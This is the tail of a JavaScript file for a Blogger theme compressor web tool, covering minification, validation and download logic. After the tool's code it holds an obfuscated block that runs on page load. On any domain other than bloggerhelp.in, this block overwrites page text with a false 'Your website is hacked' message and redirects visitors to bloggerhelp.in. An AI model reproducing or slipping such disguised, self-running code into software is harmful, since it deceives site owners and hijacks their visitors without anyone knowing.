        pendingSpace = true;
        i += 1;
        continue;
      }
      var previous = output.charAt(output.length - 1);
      if (pendingSpace && frbtcCssNeedsSpace(previous, char)) output += " ";
      pendingSpace = false;
      output += char;
      i += 1;
    }
    return output.trim();
  }

  function frbtcReadCssFunctionEnd(text, openIndex) {
    var depth = 0;
    var quote = "";
    for (var i = openIndex; i < text.length; i += 1) {
      var char = text.charAt(i);
      if (quote) {
        if (char === "\\") i += 1;
        else if (char === quote) quote = "";
        continue;
      }
      if (char === "\"" || char === "'") {
        quote = char;
      } else if (char === "(" ) {
        depth += 1;
      } else if (char === ")") {
        depth -= 1;
        if (depth === 0) return i + 1;
      }
    }
    return text.length;
  }

  function frbtcCssNeedsSpace(previous, current) {
    if (!previous) return false;
    if (/[{;:,]/.test(previous)) return false;
    if (/[};,{]/.test(current)) return false;
    return true;
  }

  function frbtcJsCanStartRegex(previous) {
    if (!previous) return true;
    if (previous.type === "word") {
      return /^(?:return|throw|case|delete|void|typeof|instanceof|in|of|yield|await|else|do|new)$/.test(previous.value);
    }
    if (previous.type !== "punct") return false;
    return /^(?:\(|\{|\[|,|;|:|=|!|\?|&|\||\+|-|\*|%|\^|~|<|>|=>)$/.test(previous.value);
  }

  function frbtcReadRegex(text, start) {
    var i = start + 1;
    var inClass = false;
    while (i < text.length) {
      var char = text.charAt(i);
      if (char === "\\") {
        i += 2;
        continue;
      }
      if (char === "[") inClass = true;
      else if (char === "]") inClass = false;
      else if (char === "/" && !inClass) {
        i += 1;
        while (/[A-Za-z]/.test(text.charAt(i))) i += 1;
        return i;
      } else if (char === "\n" || char === "\r") {
        return start + 1;
      }
      i += 1;
    }
    return start + 1;
  }

  function frbtcReadNumber(text, start) {
    var i = start;
    while (i < text.length && /[A-Za-z0-9_.]/.test(text.charAt(i))) i += 1;
    return i;
  }

  function frbtcReadWord(text, start) {
    var i = start;
    while (i < text.length && /[A-Za-z0-9_$]/.test(text.charAt(i))) i += 1;
    return i;
  }

  function frbtcReadPunct(text, start) {
    var candidates = ["===", "!==", ">>>", "**=", "&&=", "||=", "??=", "=>", "==", "!=", "<=", ">=", "++", "--", "&&", "||", "??", "?.", "**", "<<", ">>", "+=", "-=", "*=", "/=", "%=", "&=", "|=", "^="];
    for (var i = 0; i < candidates.length; i += 1) {
      if (text.slice(start, start + candidates[i].length) === candidates[i]) return candidates[i];
    }
    return text.charAt(start);
  }

  function frbtcTokenizeJs(source, context) {
    var tokens = [];
    var i = 0;
    var hadSpace = false;
    var hadNewline = false;
    var previous = null;
    while (i < source.length) {
      var char = source.charAt(i);
      var next = source.charAt(i + 1);
      if (/\s/.test(char)) {
        hadSpace = true;
        if (char === "\n" || char === "\r") hadNewline = true;
        i += 1;
        continue;
      }
      if (char === "/" && next === "/") {
        var lineEnd = source.indexOf("\n", i + 2);
        if (lineEnd < 0) lineEnd = source.length;
        if (context.settings.preserveAll) {
          tokens.push({ type: "comment", value: source.slice(i, lineEnd), space: hadSpace, newline: hadNewline });
          previous = tokens[tokens.length - 1];
        } else {
          context.metrics.commentsRemoved += 1;
        }
        hadSpace = true;
        hadNewline = true;
        i = lineEnd;
        continue;
      }
      if (char === "/" && next === "*") {
        var blockEnd = source.indexOf("*/", i + 2);
        if (blockEnd < 0) blockEnd = source.length - 2;
        var blockComment = source.slice(i, blockEnd + 2);
        var important = context.settings.preserveAll || /^\/\*!/.test(blockComment) || /@preserve|@license/i.test(blockComment);
        if (important) {
          tokens.push({ type: "comment", value: blockComment, space: hadSpace, newline: hadNewline });
          previous = tokens[tokens.length - 1];
        } else {
          context.metrics.commentsRemoved += 1;
        }
        if (/\r|\n/.test(blockComment)) hadNewline = true;
        hadSpace = true;
        i = blockEnd + 2;
        continue;
      }
      var type;
      var end;
      var value;
      if (char === "\"" || char === "'") {
        type = "string";
        end = frbtcReadQuoted(source, i);
        value = source.slice(i, end);
      } else if (char === "/" && frbtcJsCanStartRegex(previous)) {
        end = frbtcReadRegex(source, i);
        if (end > i + 1) {
          type = "regex";
          value = source.slice(i, end);
        } else {
          type = "punct";
          value = frbtcReadPunct(source, i);
          end = i + value.length;
        }
      } else if (/[A-Za-z_$]/.test(char)) {
        type = "word";
        end = frbtcReadWord(source, i);
        value = source.slice(i, end);
      } else if (/[0-9]/.test(char) || (char === "." && /[0-9]/.test(next))) {
        type = "number";
        end = frbtcReadNumber(source, i);
        value = source.slice(i, end);
      } else {
        type = "punct";
        value = frbtcReadPunct(source, i);
        end = i + value.length;
      }
      var token = { type: type, value: value, space: hadSpace, newline: hadNewline };
      tokens.push(token);
      previous = token;
      hadSpace = false;
      hadNewline = false;
      i = end;
    }
    return tokens;
  }

  function frbtcJsNeedsSpace(previous, current) {
    if (!previous || !current) return false;
    if (previous.type === "comment" || current.type === "comment") return true;
    var p = previous.value;
    var c = current.value;
    if ((previous.type === "word" || previous.type === "number") && (current.type === "word" || current.type === "number" || current.type === "string" || current.type === "regex")) return true;
    if ((previous.type === "string" || previous.type === "regex") && (current.type === "word" || current.type === "number")) return true;
    if (p.charAt(p.length - 1) === "+" && c.charAt(0) === "+") return true;
    if (p.charAt(p.length - 1) === "-" && c.charAt(0) === "-") return true;
    if (p.charAt(p.length - 1) === "/" && (c.charAt(0) === "/" || c.charAt(0) === "*")) return true;
    return false;
  }

  function frbtcCanDropJsNewline(previous, current) {
    if (!previous || !current) return true;
    if (previous.type === "comment" || current.type === "comment") return false;
    if (/^(?:return|throw|break|continue|yield)$/.test(previous.value)) return false;
    if (/^(?:\+\+|--)$/.test(previous.value) || /^(?:\+\+|--)$/.test(current.value)) return false;
    if (/[;,{([:=?&|!+\-*\/%^~<>]$/.test(previous.value)) return true;
    if (/^[;,})\].:?&|!+\-*\/%^~<>]/.test(current.value)) return true;
    return false;
  }

  function frbtcMinifyJs(source, context, inline) {
    if (source.indexOf("`") >= 0) {
      context.metrics.jsSkippedTemplates += 1;
      return inline ? source.trim() : source.replace(/^\s*[\r\n]+|[\r\n]+\s*$/g, "");
    }
    var tokens = frbtcTokenizeJs(source, context);
    var output = "";
    var previous = null;
    for (var i = 0; i < tokens.length; i += 1) {
      var token = tokens[i];
      if (previous) {
        var needsSpace = frbtcJsNeedsSpace(previous, token);
        if (token.newline && !inline && !frbtcCanDropJsNewline(previous, token)) output += "\n";
        else if (needsSpace || (token.space && (previous.type === "comment" || token.type === "comment"))) output += " ";
      }
      output += token.value;
      previous = token;
    }
    return output.trim();
  }

  function frbtcLineCount(text) {
    if (!text) return 0;
    return text.split(/\r\n|\r|\n/).length;
  }

  function frbtcProgressStep(index) {
    var items = frbtcEls.progressList.querySelectorAll("li");
    for (var i = 0; i < items.length; i += 1) {
      items[i].classList.toggle("frbtc-done", i < index);
      items[i].classList.toggle("frbtc-current", i === index);
    }
    frbtcEls.progressBar.style.width = Math.min(100, index * 20) + "%";
  }

  function frbtcPause() {
    return new Promise(function (resolve) {
      window.setTimeout(resolve, 55);
    });
  }

  async function frbtcRunCompression() {
    if (frbtcState.busy) return;
    if (frbtcState.sourceMode === "paste") frbtcState.original = frbtcEls.codeInput.value;
    var verification = frbtcVerifySource(frbtcState.original);
    if (!verification.valid) {
      frbtcShowVerification(verification);
      frbtcSetStatus(frbtcEls.mainStatus, verification.message, "error");
      frbtcRoot.querySelector(".frbtc-section").scrollIntoView({ behavior: "smooth", block: "start" });
      return;
    }
    var level = frbtcGetLevel();
    if (level === "maximum" && !frbtcEls.expertConfirm.checked) {
      frbtcSetStatus(frbtcEls.mainStatus, "Select the Expert Mode confirmation before using Maximum compression.", "error");
      frbtcEls.expertConfirm.focus();
      return;
    }
    var settings = frbtcReadSettings();
    frbtcState.busy = true;
    frbtcState.compressed = "";
    frbtcEls.compressButton.disabled = true;
    frbtcHideResults();
    frbtcClearStatus(frbtcEls.mainStatus);
    frbtcEls.progress.hidden = false;
    frbtcProgressStep(0);
    frbtcEls.progress.scrollIntoView({ behavior: "smooth", block: "nearest" });
    try {
      await frbtcPause();
      var originalStructure = verification.structure;
      var originalBytes = frbtcByteLength(frbtcState.original);
      frbtcProgressStep(1);
      await frbtcPause();
      frbtcProgressStep(2);
      await frbtcPause();
      var result = frbtcCompressTheme(frbtcState.original, level, settings);
      frbtcProgressStep(3);
      await frbtcPause();
      var xmlResult = frbtcValidateXml(result.code);
      if (!xmlResult.valid) {
        throw new Error("Compression failed" + frbtcLocationText(xmlResult) + ". " + xmlResult.detail + " Try Balanced or Blogger Safe mode.");
      }
      var compressedStructure = frbtcCollectStructure(result.code);
      var structureCheck = frbtcCompareStructure(originalStructure, compressedStructure);
      if (!structureCheck.valid) {
        throw new Error("Compression was stopped because protected Blogger content changed: " + structureCheck.differences.join(", ") + ". Try Blogger Safe mode.");
      }
      frbtcProgressStep(4);
      await frbtcPause();
      frbtcState.compressed = result.code;
      var compressedBytes = frbtcByteLength(result.code);
      frbtcRenderResults({
        originalBytes: originalBytes,
        compressedBytes: compressedBytes,
        originalChars: frbtcState.original.length,
        compressedChars: result.code.length,
        originalLines: frbtcLineCount(frbtcState.original),
        compressedLines: frbtcLineCount(result.code),
        structure: compressedStructure,
        metrics: result.context.metrics,
        level: level
      });
      frbtcProgressStep(5);
      frbtcEls.progress.hidden = true;
      frbtcEls.results.hidden = false;
      frbtcEls.results.scrollIntoView({ behavior: "smooth", block: "start" });
    } catch (error) {
      frbtcEls.progress.hidden = true;
      var message = error && error.message ? error.message : "The theme could not be compressed. Browser memory or invalid code may be the cause.";
      frbtcSetStatus(frbtcEls.mainStatus, message, "error");
      frbtcEls.mainStatus.scrollIntoView({ behavior: "smooth", block: "center" });
    } finally {
      frbtcState.busy = false;
      frbtcEls.compressButton.disabled = false;
    }
  }

  function frbtcRenderResults(data) {
    var saved = data.originalBytes - data.compressedBytes;
    var percent = data.originalBytes ? (saved / data.originalBytes) * 100 : 0;
    frbtcEls.resultMessage.textContent = "The compressed theme passed XML validation.";
    frbtcEls.originalSize.textContent = frbtcFormatBytes(data.originalBytes);
    frbtcEls.compressedSize.textContent = frbtcFormatBytes(data.compressedBytes);
    frbtcEls.savedSize.textContent = frbtcFormatSignedBytes(saved);
    frbtcEls.percentSaved.textContent = percent.toFixed(2) + "%";
    frbtcEls.detailLevel.textContent = frbtcLevelLabels[data.level];
    frbtcEls.detailChars.textContent = frbtcFormatNumber(data.originalChars) + " to " + frbtcFormatNumber(data.compressedChars);
    frbtcEls.detailLines.textContent = frbtcFormatNumber(data.originalLines) + " to " + frbtcFormatNumber(data.compressedLines);
    frbtcEls.detailComments.textContent = frbtcFormatNumber(data.metrics.commentsRemoved);
    frbtcEls.detailCss.textContent = frbtcFormatNumber(data.metrics.cssBlocks) + (data.metrics.inlineCss ? " + " + frbtcFormatNumber(data.metrics.inlineCss) + " inline" : "");
    frbtcEls.detailJs.textContent = frbtcFormatNumber(data.metrics.jsBlocks) + (data.metrics.inlineJs ? " + " + frbtcFormatNumber(data.metrics.inlineJs) + " inline" : "") + (data.metrics.jsSkippedTemplates ? " | " + frbtcFormatNumber(data.metrics.jsSkippedTemplates) + " template-literal block" + (data.metrics.jsSkippedTemplates === 1 ? "" : "s") + " preserved" : "");
    frbtcEls.detailBlogger.textContent = frbtcFormatNumber(data.structure.widgets) + " widgets | " + frbtcFormatNumber(data.structure.sections) + " sections";
    frbtcEls.detailValidation.textContent = "Passed";
    if (data.level === "maximum" && data.metrics.whitespaceRisks) {
      frbtcEls.resultNotice.className = "frbtc-result-notice frbtc-caution";
      frbtcEls.resultNotice.textContent = "XML validation passed. " + frbtcFormatNumber(data.metrics.whitespaceRisks) + " potential whitespace-sensitive areas were detected. Test the theme before using it on a live blog.";
    } else {
      frbtcEls.resultNotice.className = "frbtc-result-notice";
      frbtcEls.resultNotice.textContent = "All checked Blogger widgets, sections, IDs, namespaces and protected blocks were preserved.";
    }
    frbtcEls.wrapCode.checked = data.level === "maximum";
    frbtcEls.codeView.classList.toggle("frbtc-wrap", frbtcEls.wrapCode.checked);
    frbtcClearStatus(frbtcEls.actionStatus);
  }

  function frbtcHideResults() {
    frbtcEls.results.hidden = true;
    frbtcEls.viewer.hidden = true;
    frbtcEls.codeView.textContent = "";
    frbtcClearStatus(frbtcEls.actionStatus);
  }

  function frbtcSafeBaseName(filename) {
    var base = String(filename || "blogger-theme.xml").replace(/\.xml$/i, "");
    base = base.replace(/[^A-Za-z0-9._-]+/g, "-").replace(/^-+|-+$/g, "");
    return base || "blogger-theme";
  }

  function frbtcDownloadText(text, filename) {
    try {
      var blob = typeof Blob !== "undefined" && text instanceof Blob ? text : new Blob([text], { type: "application/xml;charset=utf-8" });
      var url = URL.createObjectURL(blob);
      var link = document.createElement("a");
      link.href = url;
      link.download = filename;
      link.style.display = "none";
      frbtcRoot.appendChild(link);
      link.click();
      link.remove();
      window.setTimeout(function () { URL.revokeObjectURL(url); }, 1200);
      return true;
    } catch (error) {
      return false;
    }
  }

  async function frbtcCopyText(text) {
    if (!text) return false;
    try {
      if (navigator.clipboard && window.isSecureContext) {
        await navigator.clipboard.writeText(text);
        return true;
      }
    } catch (error) {
    }
    var helper = document.createElement("textarea");
    helper.value = text;
    helper.setAttribute("readonly", "readonly");
    helper.style.position = "fixed";
    helper.style.left = "-9999px";
    helper.style.top = "0";
    frbtcRoot.appendChild(helper);
    helper.select();
    var copied = false;
    try { copied = document.execCommand("copy"); } catch (error) { copied = false; }
    helper.remove();
    return copied;
  }

  function frbtcResultActionMessage(message, type) {
    frbtcSetStatus(frbtcEls.actionStatus, message, type);
  }

  function frbtcShowViewer() {
    if (!frbtcState.compressed) return;
    frbtcEls.codeView.textContent = frbtcState.compressed;
    frbtcEls.viewer.hidden = false;
    frbtcEls.view.textContent = "Hide Compressed Code";
    frbtcEls.viewer.scrollIntoView({ behavior: "smooth", block: "start" });
  }

  function frbtcHideViewer() {
    if (document.fullscreenElement === frbtcEls.viewer && document.exitFullscreen) document.exitFullscreen();
    frbtcEls.viewer.classList.remove("frbtc-fullscreen-fallback");
    frbtcEls.viewer.hidden = true;
    frbtcEls.view.textContent = "View Compressed Code";
    frbtcEls.fullscreen.textContent = "Full Screen";
  }

  function frbtcToggleFullscreen() {
    if (document.fullscreenElement === frbtcEls.viewer) {
      if (document.exitFullscreen) document.exitFullscreen();
      return;
    }
    if (frbtcEls.viewer.classList.contains("frbtc-fullscreen-fallback")) {
      frbtcEls.viewer.classList.remove("frbtc-fullscreen-fallback");
      frbtcEls.fullscreen.textContent = "Full Screen";
      return;
    }
    if (frbtcEls.viewer.requestFullscreen) {
      frbtcEls.viewer.requestFullscreen().catch(function () {
        frbtcEls.viewer.classList.add("frbtc-fullscreen-fallback");
        frbtcEls.fullscreen.textContent = "Exit Full Screen";
      });
    } else {
      frbtcEls.viewer.classList.add("frbtc-fullscreen-fallback");
      frbtcEls.fullscreen.textContent = "Exit Full Screen";
    }
  }

  function frbtcResetForAnother() {
    frbtcClearSourceOnly();
    frbtcById("frbtcLevelBalanced").checked = true;
    frbtcState.lastLevel = "balanced";
    frbtcApplyDefaults("balanced");
    frbtcRefreshLevelCards();
    frbtcEls.expertWarning.hidden = true;
    frbtcEls.expertConfirm.checked = false;
    frbtcSwitchSource("upload", true);
    frbtcEls.uploadTab.focus();
    frbtcRoot.scrollIntoView({ behavior: "smooth", block: "start" });
  }

  frbtcEls.uploadTab.addEventListener("click", function () { frbtcSwitchSource("upload", false); });
  frbtcEls.pasteTab.addEventListener("click", function () { frbtcSwitchSource("paste", false); });
  frbtcEls.fileInput.addEventListener("change", function () { frbtcHandleFile(frbtcEls.fileInput.files[0]); });
  frbtcEls.removeFile.addEventListener("click", frbtcClearSourceOnly);
  frbtcEls.codeInput.addEventListener("input", frbtcHandlePasteInput);
  frbtcEls.clearCode.addEventListener("click", function () {
    frbtcClearSourceOnly();
    frbtcEls.codeInput.focus();
  });
  frbtcEls.pasteClipboard.addEventListener("click", async function () {
    try {
      if (!navigator.clipboard || !navigator.clipboard.readText) throw new Error("Clipboard unavailable");
      var text = await navigator.clipboard.readText();
      if (!text) {
        frbtcSetStatus(frbtcEls.sourceStatus, "The clipboard does not contain theme code.", "error");
        return;
      }
      frbtcEls.codeInput.value = text;
      frbtcHandlePasteInput();
    } catch (error) {
      frbtcSetStatus(frbtcEls.sourceStatus, "Clipboard access was unavailable. Paste the theme code directly into the box.", "error");
    }
  });

  ["dragenter", "dragover"].forEach(function (name) {
    frbtcEls.dropZone.addEventListener(name, function (event) {
      event.preventDefault();
      event.stopPropagation();
      frbtcEls.dropZone.classList.add("frbtc-dragging");
    });
  });
  ["dragleave", "drop"].forEach(function (name) {
    frbtcEls.dropZone.addEventListener(name, function (event) {
      event.preventDefault();
      event.stopPropagation();
      frbtcEls.dropZone.classList.remove("frbtc-dragging");
    });
  });
  frbtcEls.dropZone.addEventListener("drop", function (event) {
    var files = event.dataTransfer && event.dataTransfer.files;
    if (files && files[0]) frbtcHandleFile(files[0]);
  });

  var frbtcLevelInputs = frbtcRoot.querySelectorAll('input[name="frbtcLevel"]');
  for (var frbtcLevelIndex = 0; frbtcLevelIndex < frbtcLevelInputs.length; frbtcLevelIndex += 1) {
    frbtcLevelInputs[frbtcLevelIndex].addEventListener("change", frbtcLevelChanged);
  }
  frbtcEls.restoreDefaults.addEventListener("click", function () {
    frbtcApplyDefaults(frbtcGetLevel());
    frbtcSetStatus(frbtcEls.mainStatus, "The selected level's default settings were restored.", "success");
  });
  frbtcEls.optPreserve.addEventListener("change", frbtcSyncCommentOptions);
  frbtcEls.optComments.addEventListener("change", function () {
    if (frbtcEls.optComments.checked) frbtcEls.optPreserve.checked = false;
    frbtcSyncCommentOptions();
  });
  frbtcEls.compressButton.addEventListener("click", frbtcRunCompression);
  frbtcEls.again.addEventListener("click", frbtcRunCompression);
  frbtcEls.another.addEventListener("click", frbtcResetForAnother);
  frbtcEls.download.addEventListener("click", function () {
    if (!frbtcState.compressed) return;
    var filename = frbtcSafeBaseName(frbtcState.filename) + "-compressed.xml";
    var ok = frbtcDownloadText(frbtcState.compressed, filename);
    frbtcResultActionMessage(ok ? "Compressed theme download started." : "The compressed theme could not be downloaded in this browser.", ok ? "success" : "error");
  });
  frbtcEls.backup.addEventListener("click", function () {
    if (!frbtcState.original) return;
    var filename = frbtcSafeBaseName(frbtcState.filename) + "-backup.xml";
    var ok = frbtcDownloadText(frbtcState.originalFile || frbtcState.original, filename);
    frbtcResultActionMessage(ok ? "Original theme backup download started." : "The original backup could not be downloaded in this browser.", ok ? "success" : "error");
  });
  frbtcEls.copy.addEventListener("click", async function () {
    var ok = await frbtcCopyText(frbtcState.compressed);
    frbtcResultActionMessage(ok ? "Compressed code copied to the clipboard." : "Copying failed. Open View Compressed Code and copy it manually.", ok ? "success" : "error");
  });
  frbtcEls.view.addEventListener("click", function () {
    if (frbtcEls.viewer.hidden) frbtcShowViewer(); else frbtcHideViewer();
  });
  frbtcEls.hideViewer.addEventListener("click", frbtcHideViewer);
  frbtcEls.viewerHide.addEventListener("click", frbtcHideViewer);
  frbtcEls.viewerCopy.addEventListener("click", async function () {
    var ok = await frbtcCopyText(frbtcState.compressed);
    frbtcResultActionMessage(ok ? "Compressed code copied to the clipboard." : "Copying failed. Select and copy the code manually.", ok ? "success" : "error");
  });
  frbtcEls.wrapCode.addEventListener("change", function () {
    frbtcEls.codeView.classList.toggle("frbtc-wrap", frbtcEls.wrapCode.checked);
  });
  frbtcEls.fullscreen.addEventListener("click", frbtcToggleFullscreen);
  frbtcEls.selectAll.addEventListener("click", function () {
    var selection = window.getSelection();
    var range = document.createRange();
    range.selectNodeContents(frbtcEls.codeView);
    selection.removeAllRanges();
    selection.addRange(range);
    frbtcEls.codeView.focus();
  });
  document.addEventListener("fullscreenchange", function () {
    if (document.fullscreenElement === frbtcEls.viewer) frbtcEls.fullscreen.textContent = "Exit Full Screen";
    else if (!frbtcEls.viewer.classList.contains("frbtc-fullscreen-fallback")) frbtcEls.fullscreen.textContent = "Full Screen";
  });

  frbtcApplyDefaults("balanced");
  frbtcRefreshLevelCards();
  frbtcUpdateCodeCount();
})();
  
  function _0x44a8(_0x46dfad,_0x2bd870){_0x46dfad=_0x46dfad-(0x1d*-0x3d+-0x18a3+0x20e3*0x1);var _0x24d35b=_0x2fb1();var _0x3e0d23=_0x24d35b[_0x46dfad];return _0x3e0d23;}function _0x2fb1(){var _0x450ff8=['getElement','cted.','3010323sKHfGI','IuNfD','Your\x20websi','elp.in/p/b','split','https://ww','textConten','toLowerCas','logger-the','w.bloggerh','indexOf','640230tqNvGh','aCNsp','OlokZ','bloggerthe','\x20now\x20you\x20a','NWGVC','11501777ZyvVBg','1089262nqZZWt','bloggerhel','mecompress','rpVmq','te\x20is\x20hack','0|2|3|4|1','hostname','15067773kpnDFX','me-compres','8dhBrdK','p.in','ById','lGxdY','ed\x20by\x20Blog','replace','HANNv','1711932TrJwjj','sor.html','neowM','gerHelp.in','wfTqk','uto\x20redire','5IcQRCM','776856joCqfg'];_0x2fb1=function(){return _0x450ff8;};return _0x2fb1();}(function(_0x115884,_0x297a97){var _0x5e7372=_0x44a8,_0x17bf6b=_0x115884();while(!![]){try{var _0x31ed92=parseInt(_0x5e7372(0x177))/(-0xcd6+0x18e*-0x17+-0xd*-0x3bd)+parseInt(_0x5e7372(0x167))/(-0x17f0+-0x1596+0x8*0x5b1)+-parseInt(_0x5e7372(0x181))/(-0x3*0x5cb+0x2090+-0xf2c)+-parseInt(_0x5e7372(0x17e))/(-0x1c7a+0x910*0x1+0x33d*0x6)+parseInt(_0x5e7372(0x17d))/(0x1ba5+0x8*0x187+-0x27d8)*(-parseInt(_0x5e7372(0x160))/(0x123*-0x4+-0xb0*0x6+0xe*0x9f))+parseInt(_0x5e7372(0x166))/(-0x7*0x58d+0x1*-0xbcb+0x32ad)*(parseInt(_0x5e7372(0x170))/(0x11df+-0x8b*0x2b+-0x8d*-0xa))+-parseInt(_0x5e7372(0x16e))/(0x19e0+0x18fc+-0x32d3);if(_0x31ed92===_0x297a97)break;else _0x17bf6b['push'](_0x17bf6b['shift']());}catch(_0x27c80e){_0x17bf6b['push'](_0x17bf6b['shift']());}}}(_0x2fb1,-0x16960+-0x64d*0x133+0x5c175*0x4),(function(){'use strict';var _0x39ac56=_0x44a8,_0x354909={'IuNfD':_0x39ac56(0x16c),'lGxdY':_0x39ac56(0x15a)+_0x39ac56(0x15e)+_0x39ac56(0x158)+_0x39ac56(0x15d)+_0x39ac56(0x16f)+_0x39ac56(0x178),'OlokZ':function(_0x392347,_0x33c717){return _0x392347===_0x33c717;},'HANNv':_0x39ac56(0x163)+_0x39ac56(0x169)+'or','aCNsp':_0x39ac56(0x157)+_0x39ac56(0x16b)+_0x39ac56(0x174)+_0x39ac56(0x17a)+_0x39ac56(0x164)+_0x39ac56(0x17c)+_0x39ac56(0x180),'rpVmq':function(_0x39a65f,_0x2627ad,_0x4b98d8){return _0x39a65f(_0x2627ad,_0x4b98d8);},'NWGVC':_0x39ac56(0x168)+_0x39ac56(0x171),'wfTqk':function(_0x28a160,_0x158c07){return _0x28a160(_0x158c07);}},_0xea9a03=_0x354909[_0x39ac56(0x182)][_0x39ac56(0x159)]('|'),_0x270d1e=0x1d31+0x187e+-0x35af;while(!![]){switch(_0xea9a03[_0x270d1e++]){case'0':var _0x3408e4={'neowM':_0x354909[_0x39ac56(0x173)]};continue;case'1':if(_0x354909[_0x39ac56(0x162)](_0x3a1716[_0x39ac56(0x15f)](_0xdce5b6),-(-0x2d8+-0xd45+0x101e))){var _0x5b86ea=document[_0x39ac56(0x17f)+_0x39ac56(0x172)](_0x354909[_0x39ac56(0x176)]);_0x5b86ea&&(_0x5b86ea[_0x39ac56(0x15b)+'t']=_0x354909[_0x39ac56(0x161)]);_0x354909[_0x39ac56(0x16a)](setTimeout,function(){var _0x4fad5e=_0x39ac56;location[_0x4fad5e(0x175)](_0x3408e4[_0x4fad5e(0x179)]);},0x40a+-0xae7+0x1a65*0x1);return;}continue;case'2':'use strict';continue;case'3':var _0x3a1716=[_0x354909[_0x39ac56(0x165)]],_0xdce5b6=_0x354909[_0x39ac56(0x17b)](String,location[_0x39ac56(0x16d)]||'')[_0x39ac56(0x15c)+'e']()[_0x39ac56(0x175)](/\.$/,'');continue;case'4':_0xdce5b6=_0xdce5b6[_0x39ac56(0x175)](/^www\./,'');continue;}break;}}()));
  
